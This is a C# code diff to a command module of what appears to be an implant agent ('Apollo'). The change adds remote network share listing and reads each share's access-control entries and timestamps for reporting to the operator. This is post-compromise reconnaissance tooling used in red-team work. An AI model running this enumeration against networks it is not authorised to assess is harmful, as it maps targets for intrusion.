@@ -25,6 +25,9 @@ using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Linq;
+using System.Security.AccessControl;
+using System.Security.Principal;
+
 
 namespace Apollo.CommandModules
 {
@@ -39,11 +42,40 @@ namespace Apollo.CommandModules
             public bool Readable;
         }
 
+        private static Dictionary<string, string> GetAceInformation(FileSystemAccessRule ace)
+        {
+            StringBuilder info = new StringBuilder();
+            Dictionary<string, string> results = new Dictionary<string, string>();
+            results["account"] = ace.IdentityReference.Value;
+            results["type"] = ace.AccessControlType.ToString();
+            results["rights"] = ace.FileSystemRights.ToString();
+            results["is_inherited"] = ace.IsInherited.ToString();
+            return results;
+        }
+
+        private static Dictionary<string, string>[] GetPermissions(DirectoryInfo di)
+        {
+            List<Dictionary<string, string>> permissions = new List<Dictionary<string, string>>();
+            try
+            {
+                DirectorySecurity DirSec = di.GetAccessControl(AccessControlSections.Access);
+                foreach (FileSystemAccessRule FSAR in DirSec.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
+                {
+                    var tmp = GetAceInformation(FSAR);
+                    if (tmp.Keys.Count == 0)
+                        continue;
+                    permissions.Add(tmp);
+                }
+            }
+            catch { }
+
+            return permissions.ToArray();
+        }
+
         public static void Execute(Job job, Agent implant)
         {
             Task task = job.Task;
             string computer = task.parameters.Trim();
-
             if (string.IsNullOrEmpty(computer))
             {
                 job.SetError("No computer given to list.");
@@ -52,7 +84,55 @@ namespace Apollo.CommandModules
 
             try
             {
-                var results = GetComputerShares(computer);
+                NetShareInformation[] results = GetComputerShares(computer);
+                if (results.Length > 0)
+                {
+                    foreach (NetShareInformation share in results)
+                    {
+                        DirectoryInfo pathDir;
+                        try
+                        {
+                            pathDir = new DirectoryInfo($"\\\\{share.ComputerName}\\{share.ShareName}"); 
+                        } catch (Exception ex)
+                        {
+                            continue;
+                        }
+
+                        FileBrowserResponse resp;
+                        if (share.Readable)
+                        {
+                            resp = new FileBrowserResponse()
+                            {
+                                host = share.ComputerName,
+                                is_file = false,
+                                permissions = GetPermissions(pathDir),
+                                name = pathDir.Name,
+                                parent_path = pathDir.Parent != null ? pathDir.Parent.FullName : "",
+                                success = true,
+                                access_time = pathDir.LastAccessTimeUtc.ToString(),
+                                modify_time = pathDir.LastWriteTimeUtc.ToString(),
+                                size = 0,
+                                files = new FileInformation[0]
+                            };
+                        } else
+                        {
+                            resp = new FileBrowserResponse()
+                            {
+                                host = share.ComputerName,
+                                is_file = false,
+                                permissions = GetPermissions(pathDir),
+                                name = pathDir.Name,
+                                parent_path = pathDir.Parent != null ? pathDir.Parent.FullName : "",
+                                success = true,
+                                access_time = "",
+                                modify_time = "",
+                                size = 0,
+                                files = new FileInformation[0]
+                            };
+                        }
+                        job.AddOutput(resp);
+                    }
+                }
                 job.SetComplete(results);
 
             } catch (Exception ex)
